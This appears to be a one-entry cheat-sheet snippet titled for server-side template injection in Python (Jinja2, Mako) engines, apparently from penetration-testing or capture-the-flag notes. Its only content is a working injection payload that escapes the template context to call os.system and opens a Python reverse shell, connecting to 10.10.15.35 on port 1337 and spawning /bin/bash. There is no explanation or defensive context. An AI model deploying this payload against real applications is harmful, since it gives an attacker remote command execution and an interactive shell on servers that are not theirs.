
SSTI for Python Environment (Jinja2, Mako template engine)

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.15.35\",1337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'") }}
```